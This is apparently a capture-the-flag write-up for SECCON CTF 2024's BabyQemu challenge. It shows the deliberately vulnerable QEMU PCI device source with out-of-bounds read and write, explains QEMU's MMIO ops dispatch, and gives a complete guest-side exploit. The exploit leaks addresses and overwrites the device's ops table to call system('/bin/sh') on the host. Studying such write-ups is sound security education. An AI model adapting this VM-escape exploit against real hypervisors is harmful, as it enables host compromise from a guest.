---
title: "[CTF] SECCON CTF 2024 - BabyQemu - Write Up"
date: 2024-12-19 13:00:00 +0900
categories: [CTF, SECCON]
tags: [ctf, write-up]
---

## 0x00 Overview

The BabyQemu challenge was presented in the SECCON 2024. As you can sense from its name, this challenge is designed to teach the basics of QEMU escape exploitation.

## 0x01 Analysis

In this challenge, the source code of a QEMU MMIO device is provided. The code includes implementations of MMIO handling functions such as `mmio_read` and `mmio_write`.

```c
#include "qemu/osdep.h"
#include "hw/pci/pci_device.h"
#include "hw/qdev-properties.h"
#include "qemu/module.h"
#include "sysemu/kvm.h"
#include "qom/object.h"
#include "qapi/error.h"

#include "hw/char/baby.h"

struct PCIBabyDevState {
	PCIDevice parent_obj;

	MemoryRegion mmio;
	struct PCIBabyDevReg *reg_mmio;

	uint8_t buffer[0x100];
};

OBJECT_DECLARE_SIMPLE_TYPE(PCIBabyDevState, PCI_BABY_DEV)

static uint64_t pci_babydev_mmio_read(void *opaque, hwaddr addr, unsigned size);
static void pci_babydev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size);

static const MemoryRegionOps pci_babydev_mmio_ops = {
	.read       = pci_babydev_mmio_read,
	.write      = pci_babydev_mmio_write,
	.endianness = DEVICE_LITTLE_ENDIAN,
	.impl = {
		.min_access_size = 1,
		.max_access_size = 4,
	},
};

static void pci_babydev_realize(PCIDevice *pci_dev, Error **errp) {
	PCIBabyDevState *ms = PCI_BABY_DEV(pci_dev);
	uint8_t *pci_conf;

	debug_printf("called\n");
	pci_conf = pci_dev->config;
	pci_conf[PCI_INTERRUPT_PIN] = 0;

	ms->reg_mmio = g_malloc(sizeof(struct PCIBabyDevReg));

	memory_region_init_io(&ms->mmio, OBJECT(ms), &pci_babydev_mmio_ops, ms, TYPE_PCI_BABY_DEV"-mmio", sizeof(struct PCIBabyDevReg));
	pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY | PCI_BASE_ADDRESS_MEM_TYPE_64, &ms->mmio);
}

static void pci_babydev_reset(PCIBabyDevState *ms) {
	debug_printf("called\n");

	bzero(ms->reg_mmio, sizeof(struct PCIBabyDevReg));
	bzero(ms->buffer, sizeof(ms->buffer));
}

static void pci_babydev_uninit(PCIDevice *pci_dev) {
	PCIBabyDevState *ms = PCI_BABY_DEV(pci_dev);

	pci_babydev_reset(ms);
	g_free(ms->reg_mmio);
}

static void qdev_pci_babydev_reset(DeviceState *s) {
	PCIBabyDevState *ms = PCI_BABY_DEV(s);

	pci_babydev_reset(ms);
}

static Property pci_babydev_properties[] = {
	DEFINE_PROP_END_OF_LIST(),
};

static void pci_babydev_class_init(ObjectClass *klass, void *data) {
	DeviceClass *dc = DEVICE_CLASS(klass);
	PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);

	k->realize = pci_babydev_realize;
	k->exit = pci_babydev_uninit;
	k->vendor_id = BABY_PCI_VENDOR_ID;
	k->device_id = BABY_PCI_DEVICE_ID;
	k->revision = 0x00;
	k->class_id = PCI_CLASS_OTHERS;
	dc->desc = "SECCON CTF 2024 Challenge : Baby QEMU Escape Device";
	set_bit(DEVICE_CATEGORY_MISC, dc->categories);
	dc->reset = qdev_pci_babydev_reset;
	device_class_set_props(dc, pci_babydev_properties);
}

static const TypeInfo pci_babydev_info = {
	.name          = TYPE_PCI_BABY_DEV,
	.parent        = TYPE_PCI_DEVICE,
	.instance_size = sizeof(PCIBabyDevState),
	.class_init    = pci_babydev_class_init,
	.interfaces = (InterfaceInfo[]) {
		{ INTERFACE_CONVENTIONAL_PCI_DEVICE },
		{ },
	},
};

static void pci_babydev_register_types(void) {
	type_register_static(&pci_babydev_info);
}

type_init(pci_babydev_register_types)

static uint64_t pci_babydev_mmio_read(void *opaque, hwaddr addr, unsigned size) {
	PCIBabyDevState *ms = opaque;
	struct PCIBabyDevReg *reg = ms->reg_mmio;

	debug_printf("addr:%lx, size:%d\n", addr, size);

	switch(addr){
		case MMIO_GET_DATA:
			debug_printf("get_data (%p)\n", &ms->buffer[reg->offset]);
			return *(uint64_t*)&ms->buffer[reg->offset];	// OOB read
	}
	
	return -1;
}

static void pci_babydev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size) {
	PCIBabyDevState *ms = opaque;
	struct PCIBabyDevReg *reg = ms->reg_mmio;

	debug_printf("addr:%lx, size:%d, val:%lx\n", addr, size, val);

	switch(addr){
		case MMIO_SET_OFFSET:
			reg->offset = val;
			break;
		case MMIO_SET_OFFSET+4:
			reg->offset |= val << 32;
			break;
		case MMIO_SET_DATA:
			debug_printf("set_data (%p)\n", &ms->buffer[reg->offset]);
			*(uint64_t*)&ms->buffer[reg->offset] = (val & ((1UL << size*8) - 1)) | (*(uint64_t*)&ms->buffer[reg->offset] & ~((1UL << size*8) - 1));		// OOB write
			break;
	}
}
```

This baby device uses the `PCIBabyDevState` structure as its PIC device state.
The device performs the following three operations through the MMIO-mapped region:

- `MMIO_SET_OFFSET` : Writes a value to `reg_mmio->offset`.
- `MMIO_SET_DATA` : Writes a value to `buffer[reg_mmio->offset]`.
- `MMIO_GET_DATA` : Reads a value from `buffer[reg_mmio->offset]`.

The vulnerability in this driver is caused by insufficient validation of `reg_mmio->offset`, leading to `OOB` read and write operations when accessing `buffer[reg_mmio->offset]`.

<br>

> Since `max_access_size` is specified when defining `pci_babydev_mmio_ops`, even though the return value of `pci_babydev_mmio_read` is `uint64_t`, it should be parsed as `uint32_t`. Otherwise, a sign extension will occur during the read process, causing negative values to be returned.
{: .prompt-tip }

<br>

### Interact Qemu Device

```c
#define BABY_PCI_VENDOR_ID 0x4296
#define BABY_PCI_DEVICE_ID 0x1338
```

The header file contains the `Vendor ID` and `Device ID` of the baby device.


![Desktop View](/posts/20241219/lspci_output.png)_lspci output_

In the output of the lspci command, you can find the PCI address 00:04.0, which is the same as the baby device information.
Using this, you can identify the `resource0` file, which corresponds to the MMIO region allocated by `pci_baby_realize` within the PCI sysfs directory.

<br>

### ops overwrite exploitation

---

The version of QEMU used in this challenge is `v9.1.0`. In this version, MMIO memory handling is performed through `memory_region_dispatch_read` and `memory_region_dispatch_write`.
Both read and write operations first perform `memory_region_access_valid`, and then pass the `memory_region_[read or write]_accessor` function pointer to the `access_with_adjusted_size` function, which executes the read or write operation in `mr->ops`.
For MMIO memory reads, the `memory_region_dispatch_read1` function is added in between.

```c
MemTxResult memory_region_dispatch_read1(MemoryRegion *mr,
                                        hwaddr addr,
                                        uint64_t *pval,
                                        MemOp op,
                                        MemTxAttrs attrs)
{
	// [...]
    if (mr->ops->read) {
        return access_with_adjusted_size(addr, pval, size,
                                         mr->ops->impl.min_access_size,
                                         mr->ops->impl.max_access_size,
                                         memory_region_read_accessor,
                                         mr, attrs);
    }
	// [...]

}
MemTxResult memory_region_dispatch_write(MemoryRegion *mr,
										hwaddr addr,
										uint64_t data,
										MemOp op,
										MemTxAttrs attrs)
{
	// [...]
	if (mr->ops->write) {
        return access_with_adjusted_size(addr, &data, size,
                                         mr->ops->impl.min_access_size,
                                         mr->ops->impl.max_access_size,
                                         memory_region_write_accessor, mr,
                                         attrs);
    }
	// [...]
}
```
<br>

One key aspect to note is the memory_region_access_valid function, which, as the name suggests, checks the validity of the accessed memory.
This function checks and returns whether memory access is allowed when `valid.accepts` exists within the `MemoryRegionOps *ops` member variable of the `MemoryRegion` structure.
So, When creating a `fake_vtable` to overwrite `ops`, it is not just the read and write operations that can be modified, but also the `valid.accepts` at `ops+0x38`, which can be leveraged for a ROP attack.
<br>

```c
struct MemoryRegionOps {
    uint64_t (*read)(void *opaque,
                     hwaddr addr,
                     unsigned size);
    void (*write)(void *opaque,
                  hwaddr addr,
                  uint64_t data,
                  unsigned size);
    MemTxResult (*read_with_attrs)(void *opaque,
                                   hwaddr addr,
                                   uint64_t *data,
                                   unsigned size,
                                   MemTxAttrs attrs);
    MemTxResult (*write_with_attrs)(void *opaque,
                                    hwaddr addr,
                                    uint64_t data,
                                    unsigned size,
                                    MemTxAttrs attrs);
    enum device_endian endianness;
    struct {
        unsigned min_access_size;
        unsigned max_access_size;
        bool unaligned;
        bool (*accepts)(void *opaque, hwaddr addr,
                        unsigned size, bool is_write,
                        MemTxAttrs attrs);
    } valid;
    struct {
        unsigned min_access_size;
        unsigned max_access_size;
        bool unaligned;
    } impl;
};
```

## 0x02 Exploit

### Leak Pie, Heap and Libc

---

```c
int64_t read_mem(void *mem, int64_t offset){
    int64_t data;

    *(uint64_t *)((void*)mem + MMIO_SET_OFFSET) = offset;
    data = *(uint32_t *)((void*)mem + MMIO_GET_DATA);

    *(uint64_t *)((void *)mem + MMIO_SET_OFFSET) = offset + 4;
    data += (uint64_t)*(uint32_t *)((void*)mem + MMIO_GET_DATA) << 0x20;

    return data;
}

// [...]

uint64_t ms = read_mem(mem, 0x158);
uint64_t pb = read_mem(mem, -0xc8) - 0xd1d100;

uint64_t ms_buffer = ms + 0xBF8;
uint64_t ops_addr = ms + 0xb30;

uint64_t lb = read_mem(mem, (ms+8) - ms_buffer) - 0x5ad6f0;
```
<br>

In `pci_babydev_mmio_write`, when setting `reg->offset`, there is no validation, and since it is of type `int64_t`, the offset can be calculated from the `ms_buffer` to read the value of the desired memory.
As a result, it is possible to leak memory addresses such as those of the `PIE`, `heap`, and `libc`.
<br>

```c
void write_mem(void *mem, int64_t offset, uint64_t data, int size){
    if (size == 4 && size == 8){
        return;
    }

    *(uint64_t *)((void *)mem + MMIO_SET_OFFSET) = offset;
    *(uint64_t *)((void *)mem + MMIO_SET_DATA) = data & ((1 << 0x20) - 1);

    if(size == 8){
        *(uint64_t *)((void *)mem + MMIO_SET_OFFSET) = offset + 0x4;
        *(uint64_t *)((void *)mem + MMIO_SET_DATA) = data >> 0x20;
    }
}

	// [...]

	write_mem(mem, 0x0, system, 8);
	write_mem(mem, 0x8, mmio_write, 8);
	write_mem(mem, 0x10, *(uint64_t*)binsh, 8);
	write_mem(mem, ops_addr - ms_buffer, ms_buffer, 8);
	write_mem(mem, (ops_addr+8) - ms_buffer, ms_buffer+0x10, 4);

	// [...]
```
<br>

To achieve the goal of a QEMU escape, we create a `fake_ops` and overwrite `mmio.ops` with `fake_ops` to gain a shell. The steps are as follows:

- Overwrite `mmio.ops` with the address of `fake_ops`.
    - `fake_ops` is created at the `0x0` offset of the buffer.
    - Only modify the read part of `mmio.ops` to point to `system`, while keeping the write part (since write is needed to set the `rdi` argument).
- Set `mmio.opaque` to point to the string `/bin/sh`.
    - When executing functions within `ops` like `mmio.ops->read`, `mmio.opaque` is passed as the rdi argument.
    - Therefore, we need to write the `/bin/sh` string somewhere on the heap and then modify `mmio.opaque` to point to it.
<br>

> By collecting appropriate ROP gadgets, you can modify ops->valid.accepts and craft a ROP chain to achieve the desired outcome
{: .prompt-tip }
<br>

Here is the full exploit:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/io.h>
#include <sys/types.h>
#include <inttypes.h>
#include <assert.h>
#include <sys/stat.h>
#include <stddef.h>

#define MMIO_SET_OFFSET    offsetof(struct PCIBabyDevReg, offset)
#define MMIO_SET_DATA      offsetof(struct PCIBabyDevReg, data)
#define MMIO_GET_DATA      offsetof(struct PCIBabyDevReg, data)

#define BABY_PCI_VENDOR_ID 0x4296
#define BABY_PCI_DEVICE_ID 0x1338
#define PAGE_SIZE 0x1000

struct PCIBabyDevReg {
	off_t offset;
	uint32_t data;
};

int64_t read_mem(void *mem, int64_t offset){
    int64_t data;

    *(uint64_t *)((void*)mem + MMIO_SET_OFFSET) = offset;
    data = *(uint32_t *)((void*)mem + MMIO_GET_DATA);

    *(uint64_t *)((void *)mem + MMIO_SET_OFFSET) = offset + 4;
    data += (uint64_t)*(uint32_t *)((void*)mem + MMIO_GET_DATA) << 0x20;

    return data;
}

void write_mem(void *mem, int64_t offset, uint64_t data, int size){
    if (size == 4 && size == 8){
        return;
    }

    *(uint64_t *)((void *)mem + MMIO_SET_OFFSET) = offset;
    *(uint64_t *)((void *)mem + MMIO_SET_DATA) = data & ((1 << 0x20) - 1);

    if(size == 8){
        *(uint64_t *)((void *)mem + MMIO_SET_OFFSET) = offset + 0x4;
        *(uint64_t *)((void *)mem + MMIO_SET_DATA) = data >> 0x20;
    }
}

int main(int argc, char *argv[]) {
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if(fd < 0) {
        perror("open");
        exit(1);
    }

    void *mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);

    uint64_t ms = read_mem(mem, 0x158);
    uint64_t pb = read_mem(mem, -0xc8) - 0xd1d100;

    uint64_t ms_buffer = ms + 0xBF8;
    uint64_t ops_addr = ms + 0xb30;

    uint64_t lb = read_mem(mem, (ms+8) - ms_buffer) - 0x5ad6f0;
    
    uint64_t system = pb + 0x000000000324150;   // same as lb + 0x58740
    char *binsh = "/bin/sh\x00";
    uint64_t mmio_write = pb + 0x0000000003AE1B0;

    printf("[+] ms = 0x%lx\n", ms);
    printf("[+] pie_base = 0x%lx\n", pb);
    printf("[+] libc_base = 0x%lx\n", lb);
    printf("[+] ops_addr = 0x%lx\n", ops_addr);
    fflush(stdout);

    write_mem(mem, 0x0, system, 8);
    write_mem(mem, 0x8, mmio_write, 8);
    write_mem(mem, 0x10, *(uint64_t*)binsh, 8);
    write_mem(mem, ops_addr - ms_buffer, ms_buffer, 8);
    write_mem(mem, (ops_addr+8) - ms_buffer, ms_buffer+0x10, 4);
    
    uint64_t trigger = *(uint64_t *)((void*)mem + MMIO_GET_DATA);

    munmap(mem, PAGE_SIZE);
    close(fd);

    return 0;
}
```

## Ref
[1] Elixir qemu v9.1.0, <https://elixir.bootlin.com/qemu/v9.1.0/source/system/memory.c>